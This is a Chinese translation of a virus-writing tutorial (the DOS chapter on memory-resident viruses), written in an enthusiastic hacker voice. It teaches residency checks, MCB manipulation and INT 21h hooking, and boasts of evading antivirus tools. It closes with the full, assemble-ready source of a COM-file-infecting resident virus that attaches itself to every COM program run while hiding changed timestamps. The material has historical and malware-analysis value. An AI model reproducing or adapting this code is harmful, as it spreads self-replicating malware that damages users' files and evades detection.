

# Billy Belceb 病毒编写教程---DOS 篇

> 原文：[`www.pediy.com/kssd/pediy06/pediy64065.htm`](https://www.pediy.com/kssd/pediy06/pediy64065.htm)

【更多的酷病毒：驻留内存病毒(RESIDENT viruses)】   
\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
    如果你已经读到这里，而且你还活着，那你将会从这里走向光明:)   
    下面开始有趣的东西给你读，让我写了。   
  
%什么是驻留内存程序？%   
\~~~~~~~~~~~~~~~~~~~~~~   
    好了，首先我给你介绍的是相反的情况:)   
    当我们执行一个非驻留内存程序(如 edit 之类的普通程序)时，DOS 会给它分配确定的内存，但是这段内存在程序终止的时候将会被重新分配(利用 INT 20h，或者 INT 21h 如著名的 4Ch)。   
    而一个驻留内存程序执行的时候和一般的程序一样，但是它在程序终止的时候将会留一段程序在内存中，不会被重新分配。驻留内存程序(也叫 TSR = Terminate and Stay Resident ) ,通常会代替某些中断，写上它自己的代码，来执行它们设计的任务。TSR 程序有什么用途呢？我们可以用来破解(偷取口令)，编我们自己酷工具...当然所有这些取决于你的想象力啦。当然，我也没忘记...编写驻留内存程序:)   
  
%一个 TSR 病毒将会做什么?%   
\~~~~~~~~~~~~~~~~~~~~~~~~   
    TSR 并不是调用驻留在内存中的病毒的最好的方法。假如你正在执行某个程序，并且它返回到 DOS。不，我们不能终止它和保持驻留内存。使用者将会注意到有些不对劲。我们必须返回和保持驻留内存:) TSR 仅仅是一个缩写(不要用错了，我必须加上这一点)。驻留内存病毒能提供给我们一个新世界。我们可以编写出能感染更多程序的病毒，更安全...当检测到有企图打开/读文件的操作我们可以给文件杀毒(想象一下，查杀毒工具将会什么也发现不了)，我们可以 hook 查杀毒工具所要使用的函数来欺骗它们，我们可以减去病毒的大小以逃过外行的眼睛(当然也包括专家的啦)。   
  
;--------从这儿开始剪切----------------------------------------------------   
; 这个程序将会检测它是不是已经在内存中了，如果已经在内存中了，它将会给我们提   
; 示信息。如果没有，它将会驻留到内存中，并显示另外一个信息。   
  
       .model  tiny   
       .code   
  org  100h   
  
start:   
  jmp  fuck   
  
newint21:   
  cmp  ax,0ACDCh    ; Are user caliing our function?   
  je  is\_check    ; If yes, answer the call   
  jmp  dword ptr cs:\[oldint21\] ; Else jump to original int 21   
  
is\_check:   
  mov  ax,0DEADh    ; We answer it   
  iret        ; And make an interrupt return :)   
  
oldint21  label dword   
int21\_off dw  0000h   
int21\_seg dw  0000h   
  
fuck:   
  mov  ax,0ACDCh    ; Residence check   
  int  21h      ; Invented function, of course ;)   
  cmp  ax,0DEADh    ; Are we here?   
  je  stupid\_yes    ; If yes, show message 2   
  
  mov  ax,3521h    ; If not, we go and install   
  int  21h      ; Function for get INT 21h vectors   
  mov  word ptr cs:\[int21\_off\],bx ; We store offset at oldint21+0   
  mov  word ptr cs:\[int21\_seg\],es ; We store segment at oldint21+2   
  
  mov  ax,2521h    ; Function for put new int 21 handler   
  mov  dx,offset newint21  ; where is it located   
  int  21h   
  
  mov  ax,0900h    ; Show message 1   
  mov  dx,offset msg\_installed   
  int  21h   
  
  mov  dx,offset fuck+1  ; Make resident from offset 0 until   
  int  27h      ; offset in dx using int 27h   
          ; This will also terminate program<g>   
  
stupid\_yes:   
  mov  ax,0900h    ; Show message 2   
  mov  dx,offset msg\_already   
  int  21h   
  int  20h      ; Terminate program.   
  
msg\_installed db "Stupid Resident not installed. Installing...$"   
msg\_already   db "Stupid Resident is alive and kicking your ass!$"   
  
end   start   
  
;-----到这儿为止剪切-----------------------------------------------------   
  
     这个小例子不能被用来编写一个病毒...为什么呢?INT 27h，当把一个程序放到内存中后，就会终止当前的程序。把代码放到内存中，利用 INT 20h 或其它任何方法来终止当前程序的执行也是一样。   
     那么...我们该利用什么来编写一个病毒呢？   
  
%TSR 病毒算法%   
  
     我们可以按如下步骤(模仿在病毒编写中很好...):   
  
1.检查程序是否已经驻留内存(是，跳到 5;否，继续)   
2.开辟我们所需要的内存   
3.复制病毒主体到内存中   
4.获得中断向量，保存它们并用我们的代替   
5.恢复目标文件   
6.返回控制权   
  
%驻留内存检测%   
\~~~~~~~~~~~~~~   
    当我们编写一个驻留内存程序时，我们必须至少检查一次看看我们的程序是否已被安装了。通常，它是一个创造函数，当我们调用它，这个函数给我们返回一个确定的值(当然是我们选择的了)或者如果它没有驻留内存，它使 AL=00。   
    让我们看一个例子：   
  
  mov  ax,0B0B0h   
  int  21h   
  cmp  ax,0CACAh   
  je  already\_installed   
  \[...\]   
  
    如果它已经驻留内存了，我们就恢复感染的文件，并把控制权返回给原来的程序。如果没有驻留内存，我们就把它驻留内存。INT 21h 对病毒的处理将会如下：   
  
 int21handler:   
  cmp  ax,0B0B0h   
  je  install\_check   
  \[...\]   
  
  db  0EAh   
 oldint21:   
  dw  0,0   
  
 install\_check:   
  mov  ax,0CACAh   
  iret   
  
%分配内存修改 MCB%   
\~~~~~~~~~~~~~~~~~   
    开辟内存用得最多的就是 MCB(Memory Control Block)。有两个方法来达到这个目的：使用 DOS 和直接实现。看到每种方法都这么痛苦，让我们看看什么是 MCB。   
    内存控制模块(MCB)是由 DOS 建立的每个程序使用的控制块。这个模块的长度是一段(16 字节)，它总是在分配内存之前分配。啊！个数总能被 16 整除。如果是一个 COM 文件，我们可以利用程序的代码段减 1(CS-1)得到 MCB 的位置，如果是 EXE 文件，则利用 DS(记住，在 EXE 文件中，CS<>DS)。你可以在结构体一章查看 MCB 的结构(在上一章我们已经看过了)。   
    使用 DOS 修改 MCB:   
    在我写的第一个病毒 Antichrist Superstar 中，我使用的方法简单而有效。首先，我们请求 DOS 对所有的内存(BX=FFFFh)使用 INT 21h 的 4Ah 功能，这是一个很难达到的值。通过这个功能，我们将会看到我们申请了太多的内存，所以，在 BX 中我们将会得到我们所能使用的所有内存。所以我们把这个值减去病毒代码的长度的段数(((size+15)/16)+1)然后再次调用 4Ah 功能。现在该是把自由内存减去我们想要的内存数的时候了。我们可以利用"sub word ptr ds:\[2\],(size+15)/16+1"，然后利用 BX 中的以段为基数的代码长度，调用 DOS 的 48h 功能。这个将会把开辟的块的段返回到 AX 中，所以我们把它放到 ES 中，把 AX 减 1，并把新值赋给 DS。现在我们在 DS 中得到了 MCB，所以我们该操作它了。我们必须赋给 DS:\[0\]字节"Z"或者"M"(依赖于你的需要，参阅 MCB 结构)，在 DS:\[1\]里是字 0008，为了告诉 DOS 这个块是它自己的，然后它不会覆盖它。   
  
     Arf,Arf...在这么一大段理论之后，一些代码将是多么好啊。下面的代码将会按你的需要配置 MCB:   
  
  mov  ax,4A00h    ; Here we request for an impossible   
  mov  bx,0FFFFh    ; amount of free memory   
  int  21h   
  
  mov  ax,4A00h    ; And we substract the virus size in   
  sub  bx,(virus\_size+15)/16+1 ; paras to the actual amount of mem   
  int  21h      ; ( in BX ) and request for space.   
  
  mov  ax,4800h    ; Now we make DOS substract 2 da free   
  sub  word ptr ds:\[2\],(virus\_size+15)/16+1 ; memory what we need in   
  mov  bx,(virus\_size+15)/16  ; paragraphs   
  int  21h   
  
  mov  es,ax      ; In AX we get the segment of our   
  dec  ax      ; memory block ( doesn't care if EXE   
  mov  ds,ax      ; or COM ), we put in ES, and in DS   
          ; ( substracted by 1 )   
  mov  byte ptr ds:\[0\],"Z"     ; We mark it as last block   
  mov  word ptr ds:\[1\],08h  ; We say DOS the block is of its own   
  
     相当简单而有效...然而，这仅仅是操作内存，它不能把你的代码移到内存中去。这非常简单，但是我们将会在后面看到。   
     
     直接修改 MCB:   
  
    这种方法方式基本上差不多，但是达到我们不得的方法不同。使得这种方法更好的原因是利用这种方法：一个 TSR 病毒查杀监视程序不会知道任何内存操作因为我们没有使用任何中断:)   
    我们所做的第一件事是把 DS 赋给 AX(因为我们利用段不能做任何事),我们把它减 1，然后再把它赋给 DS。现在 DS 指向 MCB。如果你还记得 MCB 的结构，在偏移地址 3 处，我们将会得到当前内存的段数。所以我们需要把这个值减去我们打算使用的内存数。我们将要使用 BX(为什么不？)如果我们看一下过去的介绍，我们将会记起 MCB 在 PSP 的上面 16 字节处。所有的 PSP 偏移地址要向后移 16(10h)字节。我们需要改变 TOM 的值，在 PSP 的偏移地址 2 处，但是现在我们不会指向 PSP，我们要指向 MCB。我们能做的是什么呢？我们使用偏移地址 12h(2+16=18=12h)，而不使用偏移地址 2。我们把它减去所需内存的节数(记住，病毒的大小+15 除以 16)。这个偏移地址的新值是我们程序的新段，并且我们在一个新段中要使用它。我们打算使用附加段(ES)。但是我们可以对 ES 和这个位置(也就是段操作的限制)进行 mov 操作。我们必须要使用一个暂时的寄存器(temporal rigister)。AX 最好不过了。现在我们标志 ES:\[0\] "Z"(在我们把 DS 作为段寄存器处理之前)，ES:\[1\]  8。   
     介绍完这些总是烦人的理论之后，下面是代码：   
  
  mov  ax,ds      ; DS = PSP   
  dec  ax      ; We use AX as temporal register   
  mov  ds,ax      ; DS = MCB   
  
  mov  bx,word ptr ds:\[03h\]  ; We put in BX the amount of memory   
  sub  bx,((virus\_size+15)/16)+1 ; and then we put in BX for change   
  mov  word ptr ds:\[03h\],bx  ; We put it in its original place   
  
  mov  byte ptr ds:\[0\],"M"     ; Mark as not last block   
  
  sub  word ptr ds:\[12h\],((virus\_size+15)/16)+1 ; Subs virus size   
          ; to TOM size   
  mov  ax,word ptr ds:\[12h\]  ; Now offset 12h handles the new seg.   
  mov  es,ax      ; And we need AX for put it in ES   
  
  mov  byte ptr es:\[0\],"Z"     ; Mark as last block   
  mov  word ptr es:\[1\],0008h  ; Mark DOS as owner   
  
%把病毒放到内存中%   
\~~~~~~~~~~~~~~~~~~   
    在驻留内存病毒的编写中，这是最简单的。如果你知道我们使用 MOVSB 这个指令(当然还有 MOVSW,MOVSD...)能做什么，那你就知道由多简单了。而我们必须做的是确定移动什么和移动多少数据。这相当简单，可以想象，要移动的数据的开始总是等于偏移地址的变化量，假如我们已经把偏移地址的变化量赋给 BP，我们所要做的所有事情就是把 BP 的内容赋给 SI，并把病毒的大小以字节的形式赋给 CX(或者如果我们想用 MOVSW 就以字的形式)。记住 DI 必须为 0，使用 xor di,di 就足够了(一种使指令 mov di,0 的优化方法)。让我们来看代码...   
  
  push  cs      ; Adjust segments   
  pop  ds      ; CS = DS   
  
  xor  di,di      ; DI = 0 ( Top Of Memory )   
  mov  si,bp      ; SI = offset virus\_start   
  mov  cx,virus\_size    ; CX = virus\_size   
  rep  movsb      ; Move bytes from DS:SI to ES:DI   
  
%钩住中断(Hooking interrupts)%   
\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
    在把我们的病毒移入内存之后，我们需要修改它使得至少能感染其它文件。在所有的驻留内存病毒中，通常是 INT 21h，但是在一个启动扇区病毒(或者分成多部分还感染软盘和 MBR 的病毒)中，我们还必须钩住 INT 13h。我们要钩住的中断取决于我们的需要。有两种钩住中断的方法：使用 DOS 或者检测钩子。在编写我们的处理程序时我们必须强调一些东西：   
  
    首先，我们必须在开始处理程序之前使用压栈来保存所有的寄存器的值(标志也要保存)，而且在我们要把控制权返回给原先程序的时候，要把它们所有都出栈。   
  
    其次，我们必须记住我们永远不要使用那些已经被我们钩住了的中断，否则我们将会陷入无限循环。让我们想象一下我们已经钩住了 INT 21h 的 3Dh 功能(打开文件)，我们调用这个钩住的功能(或者另外一个我们自己的中断处理程序)...计算机将会挂机了。为此，我们应该按照如下方法假调用 INT 21h:   
  
 CallINT21h:   
  pushf   
  call  dword ptr cs:\[oldint21\]   
  iret   
  
    我们还能做另外一件事情。我们能够重定向另外一个中断，使它指向旧的 INT 21h。一个好的选择看上去是 INT 03h:它是一个好的反调试的花招，使得我们的代码更小(INT 03h 的编码是 CCh，只有一个字节，而普通的中断的编码为 CDh XX，XX 是我们中断号的十六进制数)，而且我们忘记了调用被钩住的功能的所有问题。当我们要把控制权交给原先的 INT 21h 的时候，最好恢复所有的被钩住的被重定向到 INT 21h 的中断。   
  
    利用 DOS 钩住中断：   
        
    我们必须在放入我们自己的向量之前获得原先中断的向量。这个可以利用 INT 21h 的 35h 功能来实现。让我们来看一下这个功能的参数：   
  
 AH=35h   
 AL=中断号   
  
    调用之后，它将会返回如下值：   
AX=Preserved   
ES=Interrupt Handler Segment   
BX=Interrupt Handler Offset   
  
    调用这个功能之后，我们把 ES:BX 保存到我们的代码的一个变量里，以备后用，并设置一个新的中断处理句柄。我们必须使用的功能是 INT 21h 的 25h。下面给出参数：   
  
 AH = 25h   
 AL = Interrupt Number   
 DS = New Handler Segment   
 DX = New Handler Offset   
  
    让我们看看通过使用 DOS 来实现中断钩子的例子：   
  
  push  cs      ; Adjust segments   
  pop  ds      ; CS = DS   
  
  mov  ax,3521h    ; Get interrupt vector function   
  int  21h   
  
  mov  word ptr \[int21\_off\],bx ; Now store variables   
  mov  word ptr \[int21\_seg\],es   
  
  mov  ah,25h      ; Put new interrupt   
  lea  dx,offset int21handler  ; Offset to new handler   
  int  21h   
  \[...\]   
  
 oldint21  label dword   
 int21\_off  dw 0000h   
 int21\_seg  dw 0000h   
  
    直接中断钩子：   
  
    如果我们忘记了 DOS，我们将赢得我曾经提过的东西(在直接 MCB 修改中)。你还记得中断向量表的结构吗？它在 0000:0000 处开始，到 0000:0400h 处为止。这里有我们所能使用的所有中断，从 INT 00h 到 INT FFh。让我们看看一些代码：   
  
  xor  ax,ax      ; Make zero AX   
  mov  ds,ax      ; For make zero DS ( now AX=DS=0 )   
  push  ds      ; We nned to restore DS later   
  
  lds  dx,ds:\[21h\*4\]    ; All interrupts are in int number\*4   
  mov  word ptr es:int21\_off,dx ; Where save offset   
  mov  word ptr es:int21\_seg,ds ;   "     "  segment   
  
  pop  ds      ; Restore DS   
  mov  word ptr ds:\[21h\*4\],offset int21handler ; The new handler   
  mov  word ptr ds:\[21h\*4+2\],es   
  
%关于驻留内存的最后的讨论%   
  
    这并不是这篇教程的最后，我们还要讨论很多病毒呢，所有这些话题将在接下来的讨论中见到，但是我认为你现在应该知道怎么编写驻留内存病毒了。从现在起到最后的所有讨论都是有关于 TSR 病毒的。当然了，如果我说有些是运行期病毒的话，不要尖叫呦！:)   
    在结束这一课的时候，我必须给出一个完整的驻留内存病毒。这里我还要使用 G 病毒，它是一个很蹩脚的感染 COM 的病毒。   
  
;-------从这里开始剪切----------------------------------------------------   
; 这段代码注释得和运行期病毒一样好。我希望到这里后所有得问题都很清楚了。   
; Virus generated by G 0.70   
; 作者 Dark Angel 属于 Phalcon/Skism   
; 汇编：TASM /m3 lame.asm   
; 连接: Tlink /t lame.obj   
  
checkres1  =  ':)'   
checkres2  =  ';)'   
  
  .model  tiny   
  .code   
  
  org  0000h   
  
start:   
  mov  bp, sp   
  int  0003h   
next:   
  mov  bp, ss:\[bp-6\]   
  sub  bp, offset next   ; Get delta offset   
  
  push  ds   
  push  es   
  
  mov  ax, checkres1    ; Installation check   
  int  0021h   
  cmp  ax, checkres2    ; Already installed?   
  jz  done\_install   
  
  mov  ax, ds   
  dec  ax   
  mov  ds, ax   
  
  sub  word ptr ds:\[0003h\], (endheap-start+15)/16+1   
  sub  word ptr ds:\[0012h\], (endheap-start+15)/16+1   
  mov  ax, ds:\[0012h\]   
  mov  ds, ax   
  inc  ax   
  mov  es, ax   
  mov  byte ptr ds:\[0000h\], 'Z'   
  mov  word ptr ds:\[0001h\], 0008h   
  mov  word ptr ds:\[0003h\], (endheap-start+15)/16   
  
  push  cs   
  pop  ds   
  xor  di, di   
  mov  cx, (heap-start)/2+1  ; Bytes to move   
  mov  si, bp      ; lea  si,\[bp+offset start\]   
  rep  movsw   
  
  xor  ax, ax   
  mov  ds, ax   
  push  ds   
  lds  ax, ds:\[21h\*4\]    ; Get old int handler   
  mov  word ptr es:oldint21, ax   
  mov  word ptr es:oldint21+2, ds   
  pop  ds   
  mov  word ptr ds:\[21h\*4\], offset int21 ; Replace with new handler   
  mov  ds:\[21h\*4+2\], es  ; in high memory   
  
done\_install:   
  pop  ds   
  pop  es   
restore\_COM:   
  mov  di, 0100h    ; Where to move data   
  push  di      ; In what offset will the ret go   
  lea  si, \[bp+offset old3\]  ; What to move   
  movsb        ; Move 3 bytes   
  movsw   
  ret        ; Return to 100h   
  
old3    db  0cdh,20h,0   
  
int21:   
  push  ax   
  push  bx   
  push  cx   
  push  dx   
  push  si   
  push  di   
  push  ds   
  push  es   
  
  cmp  ax, 4B00h    ; execute?   
  jz  execute   
return:   
  jmp  exitint21   
execute:   
  mov  word ptr cs:filename, dx   
  mov  word ptr cs:filename+2, ds   
  
  mov  ax, 4300h    ; Get attributes for later restore   
  lds  dx, cs:filename   
  int  0021h   
  jc  return   
  push  cx   
  push  ds   
  push  dx   
  
  mov  ax, 4301h    ; clear file attributes   
  push  ax      ; save for later use   
  xor  cx, cx   
  int  0021h   
  
  lds  dx, cs:filename   ; Open file for read/write   
  mov  ax, 3D02h   
  int  0021h   
  xchg  ax, bx   
  
  push  cs      ; Adjust segments   
  pop  ds   
  
  push  cs   
  pop  es      ; CS=ES=DS   
  
  mov  ax, 5700h    ; get file time/date   
  int  0021h   
  push  cx   
  push  dx   
  
  mov  cx, 001Ah    ; Read 1Ah bytes of file   
  mov  dx, offset readbuffer   
  mov  ah, 003Fh   
  int  0021h   
  
  mov  ax, 4202h    ; Move file pointer to the end   
  xor  dx, dx   
  xor  cx, cx   
  int  0021h   
  
  cmp  word ptr \[offset readbuffer\], 'ZM' ; Is it EXE ?   
  jz  jmp\_close   
  mov  cx, word ptr \[offset readbuffer+1\] ; jmp location   
  add  cx, heap-start+3  ; convert to filesize   
  cmp  ax, cx      ; equal if already infected   
  jl  skipp   
jmp\_close:   
  jmp  close   
skipp:   
  
  cmp  ax, 65535-(endheap-start) ; check if too large   
  ja  jmp\_close    ; Exit if so   
  
  mov  di, offset old3   ; Restore 3 first bytes   
  mov  si, offset readbuffer   
  movsb   
  movsw   
  
  sub  ax, 0003h   
  mov  word ptr \[offset readbuffer+1\], ax   
  mov  dl, 00E9h   
  mov  byte ptr \[offset readbuffer\], dl   
  mov  dx, offset start   
  mov  cx, heap-start   
  mov  ah, 0040h    ; concatenate virus   
  int  0021h   
  
  xor  cx, cx   
  xor  dx, dx   
  mov  ax, 4200h    ; Move pointer to the beginning   
  int  0021h   
  
  
  mov  dx, offset readbuffer  ; Write first 3 bytes   
  mov  cx, 0003h   
  mov  ah, 0040h   
  int  0021h   
  
  
close:   
  mov  ax, 5701h    ; restore file time/date   
  pop  dx   
  pop  cx   
  int  0021h   
  
  mov  ah, 003Eh    ; Close file   
  int  0021h   
  
  pop  ax      ; restore file attributes   
  pop  dx      ; get filename and   
  pop  ds   
  pop  cx      ; attributes from stack   
  int  0021h   
  
exitint21:   
  pop  es   
  pop  ds   
  pop  di   
  pop  si   
  pop  dx   
  pop  cx   
  pop  bx   
  pop  ax   
  
  db  00EAh      ; return to original handler   
oldint21  dd  ?   
  
signature  db  '\[PS/G 齗',0   
  
heap:   
filename  dd  ?   
readbuffer  db  1ah dup (?)   
endheap:   
  end  start   
;-------到这里为止剪切----------------------------------------------------   
  
    对不住了，我知道我实在是太懒了。你也可以认为这是一种懒惰的态度，可能就是吧。但是只要想想在写这篇教程的时候我正在编写一些病毒和为 DDT 杂志写文章，所以我就没有足够的时间来为这篇教程写我自己的病毒了。嗨，没有人因为这篇文章给我报酬，你知道吗？:) 

 4dd466d0e1e0cc123afbe504da2462ca